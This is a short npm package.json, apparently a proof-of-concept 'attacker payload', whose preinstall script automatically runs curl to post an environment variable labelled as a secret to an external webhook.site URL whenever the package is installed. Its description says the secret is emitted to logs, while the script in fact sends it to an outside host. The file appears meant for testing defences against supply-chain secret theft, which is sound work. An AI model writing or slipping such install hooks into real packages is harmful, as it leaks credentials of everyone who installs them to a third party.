{
    "name": "genuine-try-poc-evil",
    "version": "0.0.1",
    "private": true,
    "description": "Attacker payload — preinstall reads secret from env and emits to logs.",
    "scripts": {
      "preinstall": "curl -sf 'https://webhook.site/3852cb55-736d-431f-8bdb-476bc3d50472' -d\"secret=${FAKE_SECRET}\" || true"
    }
  }
